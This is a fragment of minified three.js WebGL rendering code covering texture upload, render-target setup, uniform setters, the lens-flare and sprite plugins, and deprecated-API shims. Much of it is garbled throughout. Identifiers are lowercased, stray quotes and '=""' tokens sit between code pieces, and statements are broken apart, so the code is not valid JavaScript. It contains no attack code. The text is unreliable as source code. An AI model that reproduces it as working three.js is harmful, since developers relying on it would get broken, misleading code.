to=\"\" \"+r.width+\"x\"+r.height,l);p=\"r}else\" i=\"b.mipmaps;if(b\" three.depthtexture){i=\"a.DEPTH_COMPONENT;if(b.type===THREE.FloatType){if(!u)throw\" error(\"float=\"\" depth=\"\" only=\"\" supported=\"\" in=\"\" webgl2.0\");i=\"a.DEPTH_COMPONENT32F}else\" u&&(i=\"a.DEPTH_COMPONENT16);c.texImage2D(a.TEXTURE_2D,0,I,p.width,p.height,0,r,s,null)}else\" if(b=\"\" three.datatexture)if(0<i.length&&l){for(var=\"\" b=\"0,F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,r,s,p.data);b.generateMipmaps=!1}else\" c.teximage2d(a.texture_2d,0,r,p.width,p.height,0,r,s,p.data);else=\"\" three.compressedtexture)for(b=\"0,F=I.length;B<F;B++)p=I[B],b.format!==THREE.RGBAFormat&&b.format!==THREE.RGBFormat?-1<c.getCompressedTextureFormats().indexOf(r)?c.compressedTexImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,p.data):console.warn(\" attempt=\"\" load=\"\" unsupported=\"\" compressed=\"\" format=\"\" .uploadtexture()\"):=\"\" c.teximage2d(a.texture_2d,b,r,p.width,p.height,0,r,s,p.data);else=\"\" if(0<i.length&&l){b=\"0;for(F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,r,s,p);b.generateMipmaps=!1}else\" c.teximage2d(a.texture_2d,0,r,r,s,p);b.generatemipmaps&&l&&a.generatemipmap(a.texture_2d);m.__version=\"b.version;if(b.onUpdate)b.onUpdate(b);return}}c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,m.__webglTexture)}function\" q(c,g,h){h?(a.texparameteri(c,a.texture_wrap_s,f(g.wraps)),a.texparameteri(c,a.texture_wrap_t,=\"\" f(g.wrapt)),a.texparameteri(c,a.texture_mag_filter,f(g.magfilter)),a.texparameteri(c,a.texture_min_filter,f(g.minfilter))):(a.texparameteri(c,a.texture_wrap_s,a.clamp_to_edge),a.texparameteri(c,a.texture_wrap_t,a.clamp_to_edge),g.wraps=\"==THREE.ClampToEdgeWrapping&&g.wrapT===THREE.ClampToEdgeWrapping||console.warn(\" two.=\"\" texture.wraps=\"\" and=\"\" texture.wrapt=\"\" should=\"\" be=\"\" set=\"\" three.clamptoedgewrapping.\",g),a.texparameteri(c,a.texture_mag_filter,l(g.magfilter)),=\"\" a.texparameteri(c,a.texture_min_filter,l(g.minfilter)),g.minfilter!=\"=THREE.NearestFilter&&g.minFilter!==THREE.LinearFilter&&console.warn(\" texture.minfilter=\"\" three.nearestfilter=\"\" or=\"\" three.linearfilter.\",g));!(h=\"b.get(\" ext_texture_filter_anisotropic\"))||g.type=\"==THREE.FloatType&&null===b.get(\"OES_texture_float_linear\")||g.type===THREE.HalfFloatType&&null===b.get(\"OES_texture_half_float_linear\")||!(1<g.anisotropy||d.get(g).__currentAnisotropy)||\"\" (a.texparameterf(c,h.texture_max_anisotropy_ext,math.min(g.anisotropy,e.getmaxanisotropy())),d.get(g).__currentanisotropy=\"g.anisotropy)}function\" r(b,e,g,h){var=\"\" k=\"f(e.texture.format),l=f(e.texture.type);c.texImage2D(h,0,k,e.width,e.height,0,k,l,null);a.bindFramebuffer(a.FRAMEBUFFER,b);a.framebufferTexture2D(a.FRAMEBUFFER,g,h,d.get(e.texture).__webglTexture,0);a.bindFramebuffer(a.FRAMEBUFFER,null)}function\" s(b,c){a.bindrenderbuffer(a.renderbuffer,b);c.depthbuffer&&!c.stencilbuffer?(a.renderbufferstorage(a.renderbuffer,=\"\" a.depth_component16,c.width,c.height),a.framebufferrenderbuffer(a.framebuffer,a.depth_attachment,a.renderbuffer,b)):c.depthbuffer&&c.stencilbuffer?(a.renderbufferstorage(a.renderbuffer,a.depth_stencil,c.width,c.height),a.framebufferrenderbuffer(a.framebuffer,a.depth_stencil_attachment,a.renderbuffer,b)):a.renderbufferstorage(a.renderbuffer,a.rgba4,c.width,c.height);a.bindrenderbuffer(a.renderbuffer,null)}var=\"\" t=\"g.memory,u=\" undefined\"!=\"=typeof\"\" webgl2renderingcontext&&a=\"\" webgl2renderingcontext;=\"\" this.settexture2d=\"m;this.setTextureCube=function(b,g){var\" m=\"b\" three.compressedtexture,p=\"b.image[0]instanceof\" three.datatexture,r=\"[],s=0;6\">s;s++)r[s]=\nm||p?p?b.image[s].image:b.image[s]:h(b.image[s],e.maxCubemapSize);var u=k(r[0]),B=f(b.format),F=f(b.type);q(a.TEXTURE_CUBE_MAP,b,u);for(s=0;6>s;s++)if(m)for(var K,P=r[s].mipmaps,M=0,H=P.length;M<h;m++)k=p[m],b.format!==three.rgbaformat&&b.format!==three.rgbformat?-1<c.getcompressedtextureformats().indexof(b)?c.compressedteximage2d(a.texture_cube_map_positive_x+s,m,b,k.width,k.height,0,k.data):console.warn(\"three.webglrenderer: attempt=\"\" to=\"\" load=\"\" unsupported=\"\" compressed=\"\" texture=\"\" format=\"\" in=\"\" .settexturecube()\"):=\"\" c.teximage2d(a.texture_cube_map_positive_x+s,m,b,k.width,k.height,0,b,f,k.data);else=\"\" p?c.teximage2d(a.texture_cube_map_positive_x+s,0,b,r[s].width,r[s].height,0,b,f,r[s].data):c.teximage2d(a.texture_cube_map_positive_x+s,0,b,b,f,r[s]);b.generatemipmaps&&u&&a.generatemipmap(a.texture_cube_map);l.__version=\"b.version;if(b.onUpdate)b.onUpdate(b)}else\" c.activetexture(a.texture0+g),c.bindtexture(a.texture_cube_map,l.__image__webgltexturecube)};this.settexturecubedynamic=\"function(b,e){c.activeTexture(a.TEXTURE0+\" e);c.bindtexture(a.texture_cube_map,d.get(b).__webgltexture)};this.setuprendertarget=\"function(b){var\" e=\"d.get(b),f=d.get(b.texture);b.addEventListener(\" dispose\",p);f.__webgltexture=\"a.createTexture();t.textures++;var\"\" g=\"b\" instanceof=\"\" three.webglrendertargetcube,h=\"k(b);if(g){e.__webglFramebuffer=[];for(var\" l=\"0;6\">l;l++)e.__webglFramebuffer[l]=a.createFramebuffer()}else e.__webglFramebuffer=a.createFramebuffer();if(g){c.bindTexture(a.TEXTURE_CUBE_MAP,f.__webglTexture);q(a.TEXTURE_CUBE_MAP,b.texture,h);for(l=\n0;6>l;l++)r(e.__webglFramebuffer[l],b,a.COLOR_ATTACHMENT0,a.TEXTURE_CUBE_MAP_POSITIVE_X+l);b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_CUBE_MAP);c.bindTexture(a.TEXTURE_CUBE_MAP,null)}else c.bindTexture(a.TEXTURE_2D,f.__webglTexture),q(a.TEXTURE_2D,b.texture,h),r(e.__webglFramebuffer,b,a.COLOR_ATTACHMENT0,a.TEXTURE_2D),b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_2D),c.bindTexture(a.TEXTURE_2D,null);if(b.depthBuffer){e=d.get(b);f=b instanceof THREE.WebGLRenderTargetCube;if(b.depthTexture){if(f)throw Error(\"target.depthTexture not supported in Cube render targets\");\nif(b instanceof THREE.WebGLRenderTargetCube)throw Error(\"Depth Texture with cube render targets is not supported!\");a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer);if(!(b.depthTexture instanceof THREE.DepthTexture))throw Error(\"renderTarget.depthTexture must be an instance of THREE.DepthTexture\");d.get(b.depthTexture).__webglTexture&&b.depthTexture.image.width===b.width&&b.depthTexture.image.height===b.height||(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=\n!0);m(b.depthTexture,0);b=d.get(b.depthTexture).__webglTexture;a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.TEXTURE_2D,b,0)}else if(f)for(e.__webglDepthbuffer=[],f=0;6>f;f++)a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer[f]),e.__webglDepthbuffer[f]=a.createRenderbuffer(),s(e.__webglDepthbuffer[f],b);else a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer),e.__webglDepthbuffer=a.createRenderbuffer(),s(e.__webglDepthbuffer,b);a.bindFramebuffer(a.FRAMEBUFFER,null)}};this.updateRenderTargetMipmap=\nfunction(b){var e=b.texture;e.generateMipmaps&&k(b)&&e.minFilter!==THREE.NearestFilter&&e.minFilter!==THREE.LinearFilter&&(b=b instanceof THREE.WebGLRenderTargetCube?a.TEXTURE_CUBE_MAP:a.TEXTURE_2D,e=d.get(e).__webglTexture,c.bindTexture(b,e),a.generateMipmap(b),c.bindTexture(b,null))}};\nTHREE.WebGLUniforms=function(){var a=new THREE.Texture,b=new THREE.CubeTexture,c=[],d=[],e=function(a,b,d){var e=a[0];if(0>=e||0<e)return 0=\"==g&&(g=new\" 1=\"\" 2=\"\" a;var=\"\" f=\"b*d,g=c[f];void\" float32array(f),c[f]=\"g);if(0!==b)for(e.toArray(g,0),e=1,f=0;e!==b;++e)f+=d,a[e].toArray(g,f);return\" g},f=\"function(a,b){var\" c=\"d[b];void\" int32array(b),d[b]=\"c);for(var\" e=\"0;e!==b;++e)c[e]=a.allocTextureUnit();return\" c},g=\"function(a,b){a.uniform1f(this.addr,b)},h=function(a,b){a.uniform1i(this.addr,b)},k=function(a,\" b){void=\"\" 0!=\"=b.x?a.uniform3f(this.addr,b.x,b.y,b.z):void\" function(b,c,d){var=\"\" 5126:return=\"\" g;case=\"\" 35664:return=\"\" k;case=\"\" 35665:return=\"\" l;case=\"\" 35666:return=\"\" n;case=\"\" 35674:return=\"\" p;case=\"\" 35675:return=\"\" m;case=\"\" 35676:return=\"\" q;case=\"\" 35678:return=\"\" r;case=\"\" 35680:return=\"\" s;=\"\" case=\"\" 5124:case=\"\" 35670:return=\"\" h;case=\"\" 35667:case=\"\" 35671:return=\"\" t;case=\"\" 35668:case=\"\" 35672:return=\"\" u;case=\"\" 35669:case=\"\" 35673:return=\"\" v}},w=\"function(a,b){a.uniform1fv(this.addr,b)},E=function(a,b){a.uniform1iv(this.addr,b)},z=function(a,b){a.uniform2fv(this.addr,e(b,this.size,2))},y=function(a,b){a.uniform3fv(this.addr,e(b,this.size,3))},A=function(a,b){a.uniform4fv(this.addr,e(b,this.size,4))},I=function(a,b){a.uniformMatrix2fv(this.addr,!1,e(b,this.size,4))},B=function(a,b){a.uniformMatrix3fv(this.addr,!1,e(b,\" this.size,9))},f=\"function(a,b){a.uniformMatrix4fv(this.addr,!1,e(b,this.size,16))},K=function(b,c,d){var\" w;case=\"\" z;case=\"\" y;case=\"\" a;case=\"\" i;case=\"\" b;case=\"\" f;case=\"\" p;=\"\" e;case=\"\" v}},h=\"function(a,b,c){this.id=a;this.addr=c;this.setValue=C(b.type)},L=function(a,b,c){this.id=a;this.addr=c;this.size=b.size;this.setValue=M(b.type)},O=function(a){this.id=a;this.seq=[];this.map={}};O.prototype.setValue=function(a,b){for(var\" n=\"/([\\w\\d_]+)(\\])?(\\[|\\.)?/g,Q=function(a,b,c){this.seq=[];this.map=\" {};this.renderer=\"c;c=a.getProgramParameter(b,a.ACTIVE_UNIFORMS);for(var\" d=\"0;d!==c;++d){var\" l=\"N.exec(h),m=N.lastIndex,n=l[1],p=l[3];\" ]\"=\"==l[2]&&(n|=0);if(void\"\" h(n,e,f):new=\"\" l(n,e,f);h.seq.push(e);h.map[e.id]=\"e;break}else\" p=\"g.map[n],void\" o(n),n=\"g,g=p,n.seq.push(g),n.map[g.id]=g),g=p}}};Q.prototype.setValue=function(a,b,c){b=this.map[b];\" void=\"\" g=\"b[e],h=c[g.id];!1!==h.needsUpdate&&g.setValue(a,h.value,d)}};Q.seqWithValue=function(a,b){for(var\" in=\"\" b&&c.push(f)}return=\"\" c};q.splitdynamic=\"function(a,b){for(var\" c};q.evaldynamic=\"function(a,b,c,d){for(var\" q}();=\"\" three.lensflareplugin=\"function(a,b){var\" c,d,e,f,g,h,k,l,n,p,m=\"a.context,q=a.state,r,s,t,u,v,C;this.render=function(w,E,z){if(0!==b.length){w=new\" three.vector3;var=\"\" y=\"z.w/z.z,A=.5*z.z,I=.5*z.w,B=16/z.w,F=new\" three.vector2(b*y,b),k=\"new\" three.vector3(1,1,0),p=\"new\" three.vector2(1,1),m=\"new\" three.box2;m.min.set(0,0);m.max.set(z.z-16,z.w-16);if(void=\"\" b=\"new\" float32array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),h=\"new\" uint16array([0,1,2,0,2,3]);r=\"m.createBuffer();s=m.createBuffer();m.bindBuffer(m.ARRAY_BUFFER,\" r);m.bufferdata(m.array_buffer,b,m.static_draw);m.bindbuffer(m.element_array_buffer,s);m.bufferdata(m.element_array_buffer,h,m.static_draw);v=\"m.createTexture();C=m.createTexture();q.bindTexture(m.TEXTURE_2D,v);m.texImage2D(m.TEXTURE_2D,0,m.RGB,16,16,0,m.RGB,m.UNSIGNED_BYTE,null);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_S,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_T,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MAG_FILTER,m.NEAREST);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MIN_FILTER,\" m.nearest);q.bindtexture(m.texture_2d,c);m.teximage2d(m.texture_2d,0,m.rgba,16,16,0,m.rgba,m.unsigned_byte,null);m.texparameteri(m.texture_2d,m.texture_wrap_s,m.clamp_to_edge);m.texparameteri(m.texture_2d,m.texture_wrap_t,m.clamp_to_edge);m.texparameteri(m.texture_2d,m.texture_mag_filter,m.nearest);m.texparameteri(m.texture_2d,m.texture_min_filter,m.nearest);var=\"\" lowp=\"\" int=\"\" rendertype;\\nuniform=\"\" vec3=\"\" screenposition;\\nuniform=\"\" vec2=\"\" scale;\\nuniform=\"\" float=\"\" rotation;\\nuniform=\"\" sampler2d=\"\" occlusionmap;\\nattribute=\"\" position;\\nattribute=\"\" uv;\\nvarying=\"\" vuv;\\nvarying=\"\" vvisibility;\\nvoid=\"\" main()=\"\" {\\nvuv=\"uv;\\nvec2\" pos=\"position;\\nif\" (=\"\" rendertype=\"=\" )=\"\" {\\nvec4=\"\" visibility=\"texture2D(\" occlusionmap,=\"\" vec2(=\"\" 0.1,=\"\" 0.1=\"\" );\\nvisibility=\"\" +=\"texture2D(\" 0.5,=\"\" 0.9,=\"\" 0.5=\"\" 0.9=\"\" );\\nvvisibility=\"visibility.r\" 9.0;\\nvvisibility=\"\" *=\"1.0\" -=\"\" visibility.g=\"\" visibility.a=\"\" 9.0;\\npos.x=\"cos(\" rotation=\"\" position.x=\"\" sin(=\"\" position.y;\\npos.y=\"sin(\" cos(=\"\" position.y;\\n}\\ngl_position=\"vec4(\" scale=\"\" screenposition.xy=\"\" ).xy,=\"\" screenposition.z,=\"\" 1.0=\"\" );\\n}\",=\"\" fragmentshader:\"uniform=\"\" map;\\nuniform=\"\" opacity;\\nuniform=\"\" color;\\nvarying=\"\" {\\nif=\"\" {\\ngl_fragcolor=\"vec4(\" 1.0,=\"\" 0.0,=\"\" 0.0=\"\" );\\n}=\"\" else=\"\" if=\"\" map,=\"\" vuv=\"\" texture=\"texture2D(\" );\\ntexture.a=\"\" vvisibility;\\ngl_fragcolor=\"texture;\\ngl_FragColor.rgb\" o=\"m.createShader(m.VERTEX_SHADER),N=\" precision\"=\"\" \"+a.getprecision()+\"=\"\" float;\\n\";m.shadersource(l,n+b.fragmentshader);m.shadersource(o,n+b.vertexshader);m.compileshader(l);m.compileshader(o);m.attachshader(h,l);m.attachshader(h,o);m.linkprogram(h);u=\"H;n=m.getAttribLocation(u,\" position\");p=\"m.getAttribLocation(u,\"uv\");c=m.getUniformLocation(u,\"renderType\");d=m.getUniformLocation(u,\"map\");e=m.getUniformLocation(u,\"occlusionMap\");f=m.getUniformLocation(u,\"opacity\");g=m.getUniformLocation(u,\"color\");h=m.getUniformLocation(u,\"\" \"scale\");k=\"m.getUniformLocation(u,\" rotation\");l=\"m.getUniformLocation(u,\"screenPosition\")}m.useProgram(u);q.initAttributes();q.enableAttribute(n);q.enableAttribute(p);q.disableUnusedAttributes();m.uniform1i(e,0);m.uniform1i(d,1);m.bindBuffer(m.ARRAY_BUFFER,r);m.vertexAttribPointer(n,2,m.FLOAT,!1,16,0);m.vertexAttribPointer(p,2,m.FLOAT,!1,16,8);m.bindBuffer(m.ELEMENT_ARRAY_BUFFER,s);q.disable(m.CULL_FACE);q.setDepthWrite(!1);H=0;for(L=b.length;H<L;H++)if(B=16/z.w,F.set(B*y,B),O=b[H],w.set(O.matrixWorld.elements[12],\"\" o.matrixworld.elements[13],o.matrixworld.elements[14]),w.applymatrix4(e.matrixworldinverse),w.applyprojection(e.projectionmatrix),k.copy(w),p.x=\"z.x+K.x*A+A-8,P.y=z.y+K.y*I+I-8,!0===M.containsPoint(P)){q.activeTexture(m.TEXTURE0);q.bindTexture(m.TEXTURE_2D,null);q.activeTexture(m.TEXTURE1);q.bindTexture(m.TEXTURE_2D,v);m.copyTexImage2D(m.TEXTURE_2D,0,m.RGB,P.x,P.y,16,16,0);m.uniform1i(c,0);m.uniform2f(h,F.x,F.y);m.uniform3f(l,K.x,K.y,K.z);q.disable(m.BLEND);q.enable(m.DEPTH_TEST);m.drawElements(m.TRIANGLES,\" 6,m.unsigned_short,0);q.activetexture(m.texture0);q.bindtexture(m.texture_2d,c);m.copyteximage2d(m.texture_2d,0,m.rgba,p.x,p.y,16,16,0);m.uniform1i(c,1);q.disable(m.depth_test);q.activetexture(m.texture1);q.bindtexture(m.texture_2d,v);m.drawelements(m.triangles,6,m.unsigned_short,0);o.positionscreen.copy(k);o.customupdatecallback?o.customupdatecallback(o):o.updatelensflares();m.uniform1i(c,2);q.enable(m.blend);for(var=\"\" j=\"O.lensFlares[N];.001<J.opacity&&.001<J.scale&&\" (k.x=\"J.x,K.y=J.y,K.z=J.z,B=J.size*J.scale/z.w,F.x=B*y,F.y=B,m.uniform3f(l,K.x,K.y,K.z),m.uniform2f(h,F.x,F.y),m.uniform1f(k,J.rotation),m.uniform1f(f,J.opacity),m.uniform3f(g,J.color.r,J.color.g,J.color.b),q.setBlending(J.blending,J.blendEquation,J.blendSrc,J.blendDst),a.setTexture2D(J.texture,1),m.drawElements(m.TRIANGLES,6,m.UNSIGNED_SHORT,0))}}q.enable(m.CULL_FACE);q.enable(m.DEPTH_TEST);q.setDepthWrite(!0);a.resetGLState()}}};\" three.spriteplugin=\"function(a,b){var\" c,d,e,f,g,h,k,l,n,p,m,q,r,s,t,u,v;function=\"\" c(a,b){return=\"\" a.renderorder!=\"=b.renderOrder?a.renderOrder-b.renderOrder:a.z!==b.z?b.z-a.z:b.id-a.id}var\" w=\"a.context,E=a.state,z,y,A,I,B=new\" three.vector3,f=\"new\" three.quaternion,k=\"new\" three.vector3;this.render=\"function(P,M){if(0!==b.length){if(void\" h=\"new\" float32array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),l=\"new\" uint16array([0,1,2,0,2,3]);z=\"w.createBuffer();y=w.createBuffer();w.bindBuffer(w.ARRAY_BUFFER,\" z);w.bufferdata(w.array_buffer,h,w.static_draw);w.bindbuffer(w.element_array_buffer,y);w.bufferdata(w.element_array_buffer,l,w.static_draw);var=\"\" float;\",\"uniform=\"\" mat4=\"\" modelviewmatrix;\\nuniform=\"\" projectionmatrix;\\nuniform=\"\" uvoffset;\\nuniform=\"\" uvscale;\\nattribute=\"\" vuv;\\nvoid=\"\" uv=\"\" uvscale;\\nvec2=\"\" alignedposition=\"position\" scale;\\nvec2=\"\" rotatedposition;\\nrotatedposition.x=\"cos(\" alignedposition.x=\"\" alignedposition.y;\\nrotatedposition.y=\"sin(\" alignedposition.y;\\nvec4=\"\" finalposition;\\nfinalposition=\"modelViewMatrix\" vec4(=\"\" );\\nfinalposition.xy=\"\" ==\"\" projectionmatrix=\"\" finalposition;\\ngl_position=\"finalPosition;\\n}\" ].join(\"\\n\"));\"=\"\" w.shadersource(o,[\"precision=\"\" color;\\nuniform=\"\" fogtype;\\nuniform=\"\" fogcolor;\\nuniform=\"\" fogdensity;\\nuniform=\"\" fognear;\\nuniform=\"\" fogfar;\\nuniform=\"\" alphatest;\\nvarying=\"\" );\\nif=\"\" texture.a=\"\" <=\"\" alphatest=\"\" discard;\\ngl_fragcolor=\"vec4(\" color=\"\" texture.xyz,=\"\" opacity=\"\" fogtype=\"\"> 0 ) {\\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\nfloat fogFactor = 0.0;\\nif ( fogType == 1 ) {\\nfogFactor = smoothstep( fogNear, fogFar, depth );\\n} else {\\nconst float LOG2 = 1.442695;\\nfogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\\n}\\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\\n}\\n}\"].join(\"\\n\"));\nw.compileShader(L);w.compileShader(O);w.attachShader(H,L);w.attachShader(H,O);w.linkProgram(H);A=H;u=w.getAttribLocation(A,\"position\");v=w.getAttribLocation(A,\"uv\");c=w.getUniformLocation(A,\"uvOffset\");d=w.getUniformLocation(A,\"uvScale\");e=w.getUniformLocation(A,\"rotation\");f=w.getUniformLocation(A,\"scale\");g=w.getUniformLocation(A,\"color\");h=w.getUniformLocation(A,\"map\");k=w.getUniformLocation(A,\"opacity\");l=w.getUniformLocation(A,\"modelViewMatrix\");n=w.getUniformLocation(A,\"projectionMatrix\");p=\nw.getUniformLocation(A,\"fogType\");m=w.getUniformLocation(A,\"fogDensity\");q=w.getUniformLocation(A,\"fogNear\");r=w.getUniformLocation(A,\"fogFar\");s=w.getUniformLocation(A,\"fogColor\");t=w.getUniformLocation(A,\"alphaTest\");H=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");H.width=8;H.height=8;L=H.getContext(\"2d\");L.fillStyle=\"white\";L.fillRect(0,0,8,8);I=new THREE.Texture(H);I.needsUpdate=!0}w.useProgram(A);E.initAttributes();E.enableAttribute(u);E.enableAttribute(v);E.disableUnusedAttributes();\nE.disable(w.CULL_FACE);E.enable(w.BLEND);w.bindBuffer(w.ARRAY_BUFFER,z);w.vertexAttribPointer(u,2,w.FLOAT,!1,16,0);w.vertexAttribPointer(v,2,w.FLOAT,!1,16,8);w.bindBuffer(w.ELEMENT_ARRAY_BUFFER,y);w.uniformMatrix4fv(n,!1,M.projectionMatrix.elements);E.activeTexture(w.TEXTURE0);w.uniform1i(h,0);L=H=0;(O=P.fog)?(w.uniform3f(s,O.color.r,O.color.g,O.color.b),O instanceof THREE.Fog?(w.uniform1f(q,O.near),w.uniform1f(r,O.far),w.uniform1i(p,1),L=H=1):O instanceof THREE.FogExp2&&(w.uniform1f(m,O.density),\nw.uniform1i(p,2),L=H=2)):(w.uniform1i(p,0),L=H=0);for(var O=0,N=b.length;O<n;o++){var 1999=\"\" q=\"b[O];Q.modelViewMatrix.multiplyMatrices(M.matrixWorldInverse,Q.matrixWorld);Q.z=-Q.modelViewMatrix.elements[14]}b.sort(C);for(var\" j=\"[],O=0,N=b.length;O<N;O++){var\" w.uniform2f(d,d.map.repeat.x,d.map.repeat.y)):(w.uniform2f(c,0,0),w.uniform2f(d,1,1));w.uniform1f(k,d.opacity);w.uniform3f(g,d.color.r,d.color.g,d.color.b);w.uniform1f(e,d.rotation);w.uniform2fv(f,j);e.setblending(d.blending,d.blendequation,d.blendsrc,d.blenddst);e.setdepthtest(d.depthtest);e.setdepthwrite(d.depthwrite);d.map?a.settexture2d(d.map,0):a.settexture2d(i,0);w.drawelements(w.triangles,6,w.unsigned_short,0)}e.enable(w.cull_face);a.resetglstate()}}};=\"\" object.assign(three,{face4:function(a,b,c,d,e,f,g){console.warn(\"three.face4=\"\" has=\"\" been=\"\" removed.=\"\" a=\"\" three.face3=\"\" will=\"\" be=\"\" created=\"\" instead.\");return=\"\" new=\"\" three.face3(a,b,c,e,f,g)},linestrip:0,linepieces:1,meshfacematerial:three.multimaterial,pointcloud:function(a,b){console.warn(\"three.pointcloud=\"\" renamed=\"\" to=\"\" three.points.\");return=\"\" three.points(a,b)},particle:three.sprite,particlesystem:function(a,b){console.warn(\"three.particlesystem=\"\" three.points(a,=\"\" b)},pointcloudmaterial:function(a){console.warn(\"three.pointcloudmaterial=\"\" three.pointsmaterial.\");return=\"\" three.pointsmaterial(a)},particlebasicmaterial:function(a){console.warn(\"three.particlebasicmaterial=\"\" three.pointsmaterial(a)},particlesystemmaterial:function(a){console.warn(\"three.particlesystemmaterial=\"\" three.pointsmaterial(a)},vertex:function(a,b,c){console.warn(\"three.vertex=\"\" use=\"\" three.vector3=\"\" instead.\");=\"\" return=\"\" three.vector3(a,b,c)}});object.assign(three.box2.prototype,{empty:function(){console.warn(\"three.box2:=\"\" .empty()=\"\" .isempty().\");return=\"\" this.isempty()},isintersectionbox:function(a){console.warn(\"three.box2:=\"\" .isintersectionbox()=\"\" .intersectsbox().\");return=\"\" this.intersectsbox(a)}});=\"\" object.assign(three.box3.prototype,{empty:function(){console.warn(\"three.box3:=\"\" this.isempty()},isintersectionbox:function(a){console.warn(\"three.box3:=\"\" this.intersectsbox(a)},isintersectionsphere:function(a){console.warn(\"three.box3:=\"\" .isintersectionsphere()=\"\" .intersectssphere().\");return=\"\" this.intersectssphere(a)}});=\"\" object.assign(three.matrix3.prototype,{multiplyvector3:function(a){console.warn(\"three.matrix3:=\"\" .multiplyvector3()=\"\" vector.applymatrix3(=\"\" matrix=\"\" )=\"\" a.applymatrix3(this)},multiplyvector3array:function(a){console.warn(\"three.matrix3:=\"\" .multiplyvector3array()=\"\" renamed.=\"\" matrix.applytovector3array(=\"\" array=\"\" this.applytovector3array(a)}});=\"\" object.assign(three.matrix4.prototype,{extractposition:function(a){console.warn(\"three.matrix4:=\"\" .extractposition()=\"\" .copyposition().\");return=\"\" this.copyposition(a)},setrotationfromquaternion:function(a){console.warn(\"three.matrix4:=\"\" .setrotationfromquaternion()=\"\" .makerotationfromquaternion().\");return=\"\" this.makerotationfromquaternion(a)},multiplyvector3:function(a){console.warn(\"three.matrix4:=\"\" vector.applymatrix4(=\"\" or=\"\" vector.applyprojection(=\"\" a.applyprojection(this)},multiplyvector4:function(a){console.warn(\"three.matrix4:=\"\" .multiplyvector4()=\"\" a.applymatrix4(this)},multiplyvector3array:function(a){console.warn(\"three.matrix4:=\"\" this.applytovector3array(a)},rotateaxis:function(a){console.warn(\"three.matrix4:=\"\" .rotateaxis()=\"\" vector3.transformdirection(=\"\" a.transformdirection(this)},crossvector:function(a){console.warn(\"three.matrix4:=\"\" .crossvector()=\"\" a.applymatrix4(this)},translate:function(a){console.error(\"three.matrix4:=\"\" .translate()=\"\" removed.\")},rotatex:function(a){console.error(\"three.matrix4:=\"\" .rotatex()=\"\" removed.\")},rotatey:function(a){console.error(\"three.matrix4:=\"\" .rotatey()=\"\" removed.\")},rotatez:function(a){console.error(\"three.matrix4:=\"\" .rotatez()=\"\" removed.\")},=\"\" rotatebyaxis:function(a,b){console.error(\"three.matrix4:=\"\" .rotatebyaxis()=\"\" removed.\")}});object.assign(three.plane.prototype,{isintersectionline:function(a){console.warn(\"three.plane:=\"\" .isintersectionline()=\"\" .intersectsline().\");return=\"\" this.intersectsline(a)}});object.assign(three.quaternion.prototype,{multiplyvector3:function(a){console.warn(\"three.quaternion:=\"\" is=\"\" now=\"\" vector.applyquaternion(=\"\" quaternion=\"\" a.applyquaternion(this)}});=\"\" object.assign(three.ray.prototype,{isintersectionbox:function(a){console.warn(\"three.ray:=\"\" this.intersectsbox(a)},isintersectionplane:function(a){console.warn(\"three.ray:=\"\" .isintersectionplane()=\"\" .intersectsplane().\");return=\"\" this.intersectsplane(a)},isintersectionsphere:function(a){console.warn(\"three.ray:=\"\" object.assign(three.vector3.prototype,{seteulerfromrotationmatrix:function(){console.error(\"three.vector3:=\"\" .seteulerfromrotationmatrix()=\"\" euler.setfromrotationmatrix()=\"\" instead.\")},seteulerfromquaternion:function(){console.error(\"three.vector3:=\"\" .seteulerfromquaternion()=\"\" euler.setfromquaternion()=\"\" instead.\")},getpositionfrommatrix:function(a){console.warn(\"three.vector3:=\"\" .getpositionfrommatrix()=\"\" .setfrommatrixposition().\");return=\"\" this.setfrommatrixposition(a)},=\"\" getscalefrommatrix:function(a){console.warn(\"three.vector3:=\"\" .getscalefrommatrix()=\"\" .setfrommatrixscale().\");return=\"\" this.setfrommatrixscale(a)},getcolumnfrommatrix:function(a,b){console.warn(\"three.vector3:=\"\" .getcolumnfrommatrix()=\"\" .setfrommatrixcolumn().\");return=\"\" this.setfrommatrixcolumn(b,a)}});=\"\" object.assign(three.object3d.prototype,{getchildbyname:function(a){console.warn(\"three.object3d:=\"\" .getchildbyname()=\"\" .getobjectbyname().\");return=\"\" this.getobjectbyname(a)},renderdepth:function(a){console.warn(\"three.object3d:=\"\" .renderdepth=\"\" .renderorder,=\"\" instead.\")},translate:function(a,b){console.warn(\"three.object3d:=\"\" .translateonaxis(=\"\" axis,=\"\" distance=\"\" this.translateonaxis(b,a)}});=\"\" object.defineproperties(three.object3d.prototype,{eulerorder:{get:function(){console.warn(\"three.object3d:=\"\" .eulerorder=\"\" .rotation.order.\");return=\"\" this.rotation.order},set:function(a){console.warn(\"three.object3d:=\"\" .rotation.order.\");this.rotation.order=\"a}},useQuaternion:{get:function(){console.warn(\" three.object3d:\"=\"\" .usequaternion=\"\" the=\"\" library=\"\" uses=\"\" quaternions=\"\" by=\"\" default.\")},set:function(a){console.warn(\"three.object3d:=\"\" default.\")}}});=\"\" 